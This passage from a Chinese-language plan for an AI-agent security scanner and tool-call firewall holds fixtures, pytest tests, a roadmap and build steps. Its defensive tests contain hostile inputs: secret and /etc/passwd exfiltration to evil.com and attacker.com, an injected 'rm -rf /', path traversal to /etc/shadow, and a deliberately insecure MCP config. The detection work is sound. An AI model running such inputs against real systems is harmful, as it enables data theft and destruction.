    """Post data to a webhook URL."""
    # 外部通信
    response = requests.post(url, json={"payload": payload})
    return f"Status: {response.status_code}"
```

```json
// tests/fixtures/mcp_configs/vulnerable_config.json
{
    "mcpServers": {
        "filesystem": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]
        },
        "untrusted-server": {
            "url": "mcp://sketchy-domain.example.com:9090"
        },
        "shell-executor": {
            "command": "python",
            "args": ["./tools/shell.py"],
            "env": {
                "API_KEY": "sk-1234567890abcdef1234567890abcdef"
            }
        }
    }
}
```

## 4.2 测试用例

```python
# tests/test_scanners/test_python_scanner.py

import pytest
from pathlib import Path
from agent_audit.scanners.python_scanner import PythonScanner
from agent_audit.models.tool import PermissionType

class TestPythonScanner:
    
    @pytest.fixture
    def scanner(self):
        return PythonScanner()
    
    @pytest.fixture
    def fixtures_path(self):
        return Path(__file__).parent.parent / "fixtures" / "vulnerable_agents"
    
    def test_detects_command_injection(self, scanner, fixtures_path):
        """应该检测到命令注入漏洞"""
        results = scanner.scan(fixtures_path / "command_injection.py")
        
        assert len(results) == 1
        result = results[0]
        
        # 检查发现的工具
        assert len(result.tools) >= 1
        
        # 检查危险模式
        dangerous = result.dangerous_patterns
        assert len(dangerous) > 0
        
        # 应该找到 shell=True
        shell_true_patterns = [p for p in dangerous if p['type'] == 'shell_true']
        assert len(shell_true_patterns) > 0
        
    def test_detects_subprocess_with_shell_true(self, scanner, fixtures_path):
        """应该检测到 subprocess.run(shell=True)"""
        results = scanner.scan(fixtures_path / "command_injection.py")
        result = results[0]
        
        shell_patterns = [
            p for p in result.dangerous_patterns 
            if p.get('type') == 'shell_true'
        ]
        assert len(shell_patterns) > 0
        assert shell_patterns[0]['function'] == 'subprocess.run'
        
    def test_detects_tool_decorators(self, scanner, fixtures_path):
        """应该检测到 @tool 装饰器"""
        results = scanner.scan(fixtures_path / "command_injection.py")
        result = results[0]
        
        tool_names = [t.name for t in result.tools]
        assert 'execute_command' in tool_names
        assert 'read_file' in tool_names
        
    def test_infers_permissions(self, scanner, fixtures_path):
        """应该正确推断权限"""
        results = scanner.scan(fixtures_path / "command_injection.py")
        result = results[0]
        
        exec_tool = next(t for t in result.tools if t.name == 'execute_command')
        assert PermissionType.SHELL_EXEC in exec_tool.permissions
        
        read_tool = next(t for t in result.tools if t.name == 'read_file')
        assert PermissionType.FILE_READ in read_tool.permissions
        
    def test_detects_tainted_input(self, scanner, fixtures_path):
        """应该检测到污点输入"""
        results = scanner.scan(fixtures_path / "command_injection.py")
        result = results[0]
        
        # subprocess.run 调用应该标记为有污点输入
        sub_patterns = [
            p for p in result.dangerous_patterns 
            if p['function'] == 'subprocess.run'
        ]
        assert any(p.get('has_tainted_input', False) for p in sub_patterns)
        
    def test_excludes_test_files(self, scanner):
        """应该排除测试文件"""
        scanner_with_exclude = PythonScanner(exclude_paths=['test_'])
        results = scanner_with_exclude.scan(Path(__file__).parent)
        
        # 不应该扫描测试文件本身
        scanned_files = [r.source_file for r in results]
        assert not any('test_python_scanner' in f for f in scanned_files)
```

```python
# tests/test_layers/test_chain_analyzer.py

import pytest
from datetime import datetime
from collections import deque

from agent_firewall.layers.chain_analyzer import ChainAnalyzer
from agent_firewall.models.request import ToolCallRequest
from agent_firewall.models.session import SessionState

class TestChainAnalyzer:
    
    @pytest.fixture
    def analyzer(self):
        return ChainAnalyzer()
    
    @pytest.fixture
    def empty_session(self):
        return SessionState(
            session_id="test-session",
            created_at=datetime.utcnow(),
            last_activity=datetime.utcnow()
        )
    
    def _make_request(self, tool_name: str, **kwargs) -> ToolCallRequest:
        return ToolCallRequest(
            request_id="test-req",
            timestamp=datetime.utcnow(),
            tool_name=tool_name,
            tool_arguments=kwargs,
            mcp_server="test-server"
        )
    
    def test_detects_credential_exfiltration(self, analyzer, empty_session):
        """应该检测到凭证外泄链"""
        session = empty_session
        
        # 先添加一个获取凭证的操作
        session.add_operation({
            'tool_name': 'get_secret',
            'arguments': {'name': 'API_KEY'}
        })
        
        # 然后尝试 HTTP POST
        request = self._make_request('http_post', url='http://evil.com', data='...')
        
        result = analyzer.analyze(request, session)
        
        assert result.risk_score > 0.8
        assert 'credential_exfiltration' in result.detected_patterns
        
    def test_safe_operations_low_risk(self, analyzer, empty_session):
        """安全操作应该返回低风险"""
        session = empty_session
        
        session.add_operation({'tool_name': 'get_time', 'arguments': {}})
        
        request = self._make_request('calculator', expression='2+2')
        
        result = analyzer.analyze(request, session)
        
        assert result.risk_score < 0.3
        assert len(result.detected_patterns) == 0
        
    def test_detects_file_exfiltration(self, analyzer, empty_session):
        """应该检测到文件外泄链"""
        session = empty_session
        
        session.add_operation({
            'tool_name': 'read_file',
            'arguments': {'path': '/etc/passwd'}
        })
        
        request = self._make_request('http_post', url='http://attacker.com')
        
        result = analyzer.analyze(request, session)
        
        assert 'file_exfiltration' in result.detected_patterns
        
    def test_pattern_distance_constraint(self, analyzer, empty_session):
        """超过最大距离的模式不应匹配"""
        session = empty_session
        
        # 添加敏感操作
        session.add_operation({'tool_name': 'get_secret', 'arguments': {}})
        
        # 添加多个无关操作（超过 max_distance）
        for i in range(10):
            session.add_operation({'tool_name': f'safe_op_{i}', 'arguments': {}})
        
        # HTTP POST 距离太远
        request = self._make_request('http_post', url='http://example.com')
        
        result = analyzer.analyze(request, session)
        
        # 不应该匹配 credential_exfiltration（距离超限）
        # 但仍然会因为 sensitive_data_external_access 而标记
        assert 'credential_exfiltration' not in result.detected_patterns
        
    def test_cumulative_risk_increases(self, analyzer, empty_session):
        """累积风险应该逐渐增加"""
        session = empty_session
        session.cumulative_risk = 0.5
        
        request = self._make_request('some_tool')
        result = analyzer.analyze(request, session)
        
        # 累积因素应该增加风险
        assert result.risk_score >= 0.05  # 至少有累积贡献
```

```python
# tests/test_layers/test_fast_path.py

import pytest
from agent_firewall.layers.fast_path import FastPathAnalyzer, FastPathConfig
from agent_firewall.models.request import ToolCallRequest
from agent_firewall.models.decision import DecisionAction
from datetime import datetime

class TestFastPath:
    
    @pytest.fixture
    def analyzer(self):
        config = FastPathConfig(
            allowlist={'get_time', 'calculator'},
            blocklist={'format_disk', 'delete_all'}
        )
        return FastPathAnalyzer(config)
    
    def _make_request(self, tool_name: str, **kwargs) -> ToolCallRequest:
        return ToolCallRequest(
            request_id="test",
            timestamp=datetime.utcnow(),
            tool_name=tool_name,
            tool_arguments=kwargs,
            mcp_server="test"
        )
    
    def test_allowlist_passes(self, analyzer):
        """白名单工具应直接放行"""
        request = self._make_request('get_time')
        result = analyzer.analyze(request)
        
        assert not result.should_continue
        assert result.decision == DecisionAction.ALLOW
        
    def test_blocklist_blocks(self, analyzer):
        """黑名单工具应直接阻止"""
        request = self._make_request('format_disk')
        result = analyzer.analyze(request)
        
        assert not result.should_continue
        assert result.decision == DecisionAction.BLOCK
        
    def test_command_injection_detected(self, analyzer):
        """应检测参数中的命令注入"""
        request = self._make_request('run', command='ls; rm -rf /')
        result = analyzer.analyze(request)
        
        assert not result.should_continue
        assert result.decision == DecisionAction.BLOCK
        
    def test_path_traversal_detected(self, analyzer):
        """应检测路径遍历"""
        request = self._make_request('read_file', path='../../etc/passwd')
        result = analyzer.analyze(request)
        
        assert not result.should_continue
        assert result.decision == DecisionAction.BLOCK
        
    def test_sensitive_path_blocked(self, analyzer):
        """应阻止敏感路径访问"""
        request = self._make_request('read_file', file='/etc/shadow')
        result = analyzer.analyze(request)
        
        assert not result.should_continue
        assert result.decision == DecisionAction.BLOCK
        
    def test_unknown_tool_continues(self, analyzer):
        """未知工具应继续到下一层"""
        request = self._make_request('custom_tool', data='hello')
        result = analyzer.analyze(request)
        
        assert result.should_continue
        
    def test_performance_under_5ms(self, analyzer):
        """快速路径应在 5ms 内完成"""
        import time
        
        request = self._make_request('some_tool', data='test')
        
        start = time.perf_counter()
        for _ in range(1000):
            analyzer.analyze(request)
        elapsed = (time.perf_counter() - start) / 1000
        
        assert elapsed < 0.005  # < 5ms per call
```

---

# Part 5: 实施路线图

## 5.1 Phase 0: 环境搭建 (Week 0)

### 任务清单

```
□ 初始化 Git 仓库
□ 设置 monorepo 结构
□ 配置 pyproject.toml (Poetry workspace)
□ 配置 CI/CD (GitHub Actions)
□ 配置 pre-commit hooks (black, ruff, mypy)
□ 注册 PyPI 包名: agent-audit, agent-firewall, agent-security-core
□ 注册域名: agent-audit.dev
□ 创建 GitHub org
```

### 依赖安装

```bash
# 安装 Poetry
curl -sSL https://install.python-poetry.org | python3 -

# 初始化 workspace
mkdir agent-security-suite && cd agent-security-suite
poetry init

# 创建子包
mkdir -p packages/{core,audit,firewall}

# 安装核心依赖
cd packages/core
poetry add pyyaml pydantic

cd ../audit
poetry add click rich

cd ../firewall
poetry add aiohttp aiofiles
```

## 5.2 Phase 1: Agent Audit CLI MVP (Week 1-2)

### Week 1 任务

| 天 | 任务 | 输出 | 验收标准 |
|----|------|------|---------|
| D1 | 数据模型实现 | `models/` 完整 | 所有模型有 type hints, 通过 mypy |
| D2 | Python Scanner | `scanners/python_scanner.py` | 能扫描 fixtures, 发现 3 种漏洞 |
| D3 | MCP Scanner | `scanners/mcp_scanner.py` | 能解析 3 种配置格式 |
| D4 | Secret Scanner | `scanners/secret_scanner.py` | 能发现 API keys, tokens |
| D5 | Config Scanner | `scanners/config_scanner.py` | 能分析 YAML/JSON 配置 |

### Week 2 任务

| 天 | 任务 | 输出 | 验收标准 |
|----|------|------|---------|
| D1 | 规则引擎 | `rules/engine.py` | 5 条内置规则通过测试 |
| D2 | OWASP 规则集 | `rules/builtin/*.yaml` | AGENT-001 到 AGENT-005 完整 |
| D3 | CLI 主框架 | `cli/main.py`, `cli/commands/scan.py` | `agent-audit scan .` 可运行 |
| D4 | 终端输出 | `cli/formatters/terminal.py` | 彩色输出, 风险评分可视化 |
| D5 | SARIF 输出 + JSON | `cli/formatters/sarif.py` | GitHub Code Scanning 兼容 |

### MVP 发布标准

```bash
# MVP 应该能做到：
$ pip install agent-audit

$ agent-audit scan ./my-agent-project
# 输出:
# Agent Audit Security Report
# ━━━━━━━━━━━━━━━━━━━━━━━━━
# Scanned: ./my-agent-project
#
# 🔴 CRITICAL (2)
# AGENT-001: Command Injection via Unsanitized Input
#   Location: tools/shell.py:23
#   Code: subprocess.run(user_input, shell=True)
#   Fix: Use shlex.quote() and avoid shell=True
#
# AGENT-004: Hardcoded Credentials
#   Location: config.py:5
#   Code: api_key = "sk-1234..."
#   Fix: Use environment variables
#
# 🟠 HIGH (1)
# AGENT-002: Potential Data Exfiltration Chain
#   Tools: get_secret → http_post
#   Fix: Implement network allowlist
#
# ━━━━━━━━━━━━━━━━━━━━━━━━━
# Risk Score: 7.2/10 (HIGH)
# Findings: 2 critical, 1 high, 0 medium

$ agent-audit scan . --format sarif -o results.sarif
# 生成 GitHub Code Scanning 兼容的 SARIF 文件

$ echo $?
# 1 (有 high 或以上级别的发现)
```

## 5.3 Phase 2: Agent Audit 完善 (Week 3-4)

### 任务清单

```
Week 3:
□ 添加 10 条规则（覆盖 OWASP Agentic Top 10 全部）
□ 实现 `agent-audit inspect mcp://...` 命令
□ 实现 `agent-audit init` 命令
□ 实现 Markdown 输出格式
□ 实现自定义规则加载

Week 4:
□ 创建 GitHub Action
□ 编写文档 (README, rules-reference, contributing)
□ 性能优化（大项目 < 10s）
□ 发布 v0.1.0 到 PyPI
□ 发布到 GitHub
```

### v0.1.0 发布检查清单

```
□ 所有测试通过 (pytest --cov > 80%)
□ mypy 检查通过
□ README 完整（安装、使用、规则列表）
□ LICENSE 文件
□ CHANGELOG.md
□ PyPI 发布成功
□ GitHub Action 可用
□ 示例项目可运行
```

## 5.4 Phase 3: Agent Firewall MVP (Week 5-8)

### Week 5-6 任务

| 天 | 任务 | 输出 | 验收标准 |
|----|------|------|---------|
| W5-D1 | 请求/决策模型 | `models/` | 类型完整, 序列化正确 |
| W5-D2 | 会话管理 | `engine/session.py` | 内存存储, 滑动窗口 |
| W5-D3 | Layer 1 快速路径 | `layers/fast_path.py` | < 5ms, 全部测试通过 |
| W5-D4 | Layer 1 测试 | 测试文件 | 覆盖率 > 90% |
| W5-D5 | Layer 2 行为链 | `layers/chain_analyzer.py` | 5 种危险链检测 |
| W6-D1 | Layer 2 测试 | 测试文件 | 覆盖率 > 85% |
| W6-D2 | Layer 3 语义审查 | `layers/semantic_reviewer.py` | 回退模式可工作 |
| W6-D3 | 决策引擎 | `engine/decision.py` | 三层协调正确 |
| W6-D4 | Docker MCP 适配器 | `adapters/docker_mcp.py` | STDIO 模式可工作 |
| W6-D5 | 审计日志 | `storage/audit_log.py` | JSONL 输出正确 |

### Week 7-8 任务

| 天 | 任务 | 输出 | 验收标准 |
|----|------|------|---------|
| W7-D1 | CLI 主框架 | `cli/main.py` | start/config/status 命令 |
| W7-D2 | 终端通知器 | `notifiers/terminal.py` | 实时终端 UI |
| W7-D3 | Slack 通知器 | `notifiers/slack.py` | Block Kit 消息正确 |
| W7-D4 | 配置加载 | YAML 配置系统 | 默认/自定义配置 |
| W7-D5 | Dockerfile | Docker 镜像 | 镜像可构建运行 |
| W8-D1 | 集成测试 | 端到端测试 | 完整流程可工作 |
| W8-D2 | Docker MCP 集成测试 | 与真实 Gateway 测试 | 拦截/放行正确 |
| W8-D3 | 性能测试 | 基准测试 | Layer 1 < 5ms, Layer 2 < 50ms |
| W8-D4 | 文档 | README, 部署指南 | 新用户可跟随部署 |
| W8-D5 | 发布 v0.1.0 | PyPI + Docker Hub | 安装即用 |

### Firewall MVP 验收标准

```bash
# 方式 1: 独立运行
$ agent-firewall start --config config.yaml
# [Agent Firewall] Running on port 8080
# [Agent Firewall] Layer 1: Fast Path ✓
# [Agent Firewall] Layer 2: Chain Analyzer ✓
# [Agent Firewall] Layer 3: Semantic Reviewer ✓ (fallback mode)
# [Agent Firewall] Waiting for requests...

# 方式 2: Docker MCP Gateway 集成
$ docker mcp gateway run \
    --interceptor=before:exec:"python -m agent_firewall intercept"

# 方式 3: Docker 容器
$ docker run -d \
    -e AGENT_FIREWALL_CONFIG=/config/default.yaml \
    agent-firewall:latest
```

## 5.5 Phase 4: 商业化 (Week 9-12)

### Week 9-10: Pro 功能

```
□ 高级规则集（金融/医疗/PCI-DSS）
□ CI/CD 深度集成（GitHub/GitLab/Bitbucket）
□ Web Dashboard（React，展示审计历史）
□ 团队协作功能
□ API Key 认证
```

### Week 11-12: 发布与推广

```
□ Landing page (agent-audit.dev)
□ 3 篇技术博客
□ HackerNews / Reddit 发布
□ Docker MCP 社区推广
□ Product Hunt 发布
□ 收费基础设施搭建 (Stripe)
```

---

# Part 6: 技术决策记录

## 6.1 为什么用 Python 而不是 Go/Rust

| 因素 | Python | Go | Rust |
|------|--------|-----|------|
| AST 分析生态 | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐ |
| LLM 客户端 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ |
| 开发速度 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ |
| 目标用户熟悉度 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ |
| 性能 | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 二进制分发 | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

**决策**: Python（Phase 1-3），性能瓶颈组件用 Rust 重写（Phase 4+）

## 6.2 为什么 YAML 规则而不是 Python/Rego

| 因素 | YAML | Python | Rego |
|------|------|--------|------|
| 非开发者可编辑 | ✅ | ❌ | ❌ |
| 安全（不可执行任意代码） | ✅ | ❌ | ✅ |
| 表达力 | 中等 | 高 | 高 |
| 学习曲线 | 低 | 中 | 高 |

**决策**: YAML（主要规则格式）+ Python（高级自定义规则）

## 6.3 关键库选择

| 需求 | 选择 | 备选 | 理由 |
|------|------|------|------|
| CLI | Click | Typer | 更成熟，社区更大 |
| 终端 UI | Rich | Textual | 功能够用，更轻量 |
| 异步 HTTP | aiohttp | httpx | Firewall 需要高并发 |
| 数据验证 | Pydantic | dataclasses | 类型安全 + 序列化 |
| YAML | PyYAML | ruamel.yaml | 标准库级别的普及度 |
| 测试 | pytest | unittest | 行业标准 |
| 代码格式化 | Black + Ruff | flake8 | 更快，更现代 |

---

# Part 7: 给 Coding Agent 的执行指令

## 7.1 执行顺序

```
STEP 1: 创建 monorepo 骨架
  - 所有目录结构
  - 所有 pyproject.toml
  - 所有 __init__.py
  
STEP 2: 实现核心数据模型 (packages/core/)
  - models/finding.py (直接复制本文档 1.5.1)
  - models/tool.py (直接复制本文档 1.5.2)
  - models/risk.py
  
STEP 3: 实现 Python Scanner
  - scanners/base.py (定义 BaseScanner)
  - scanners/python_scanner.py (直接复制本文档 1.6.3)
  - tests/test_scanners/test_python_scanner.py
  
STEP 4: 实现 MCP Scanner
  - scanners/mcp_scanner.py (直接复制本文档 1.6.4)
  - tests/test_scanners/test_mcp_scanner.py
  
STEP 5: 实现规则引擎
  - rules/engine.py (直接复制本文档 1.6.5)
  - rules/builtin/owasp_agentic.yaml (直接复制本文档 1.5.3)
  - 添加其余 4 条规则的 YAML 文件
  - tests/test_rules/test_engine.py
  
STEP 6: 实现 CLI
  - cli/main.py (直接复制本文档 1.6.1)
  - cli/commands/scan.py (直接复制本文档 1.6.2)
  - cli/formatters/terminal.py (直接复制本文档 1.6.6)
  - cli/formatters/sarif.py
  - cli/formatters/json.py
  
STEP 7: 创建测试夹具
  - tests/fixtures/vulnerable_agents/ (复制本文档 4.1)
  - tests/fixtures/mcp_configs/
  
STEP 8: 运行所有测试，修复问题
  - pytest --cov=agent_audit
  
STEP 9: 实现 Firewall 核心
  - 按照 Part 2 的顺序实现
  - 先实现 models/ -> layers/ -> engine/ -> adapters/
  
STEP 10: 实现 Docker 集成
  - Dockerfile
  - docker-compose.yml
  - Docker MCP Gateway 配置
```

## 7.2 编码规范

```
1. 所有代码使用 type hints
2. 所有公共方法有 docstring
3. 使用 dataclass 或 Pydantic BaseModel
4. 异步代码使用 async/await
5. 错误处理：不吞掉异常，使用自定义异常类
6. 日志：使用 logging 模块，不用 print
7. 测试：每个模块对应测试文件
8. 格式：Black (line-length=100), Ruff
```

## 7.3 关键注意事项

```
1. Python Scanner 中的 AST 分析是核心难点
   - 注意处理各种导入方式 (import, from...import, alias)
   - 注意处理嵌套函数和类
   - 需要支持 Python 3.9+ 的所有语法

2. MCP Scanner 需要处理多种配置格式
   - Claude Desktop: mcpServers
   - Docker MCP: gateway.servers
   - 标准 MCP: servers[]

3. 规则引擎的模式匹配要注意性能
   - 预编译正则表达式
   - 避免在循环中编译

4. Firewall 的 Docker MCP 适配器
   - 必须严格遵循 Docker Gateway 的 STDIO 协议
   - 超时处理很关键（default: block on timeout）
   - 输出必须是单行 JSON

5. 行为链分析需要处理工具名称的模糊匹配
   - get_secret ≈ getSecret ≈ get-secret
   - 需要规范化处理
```
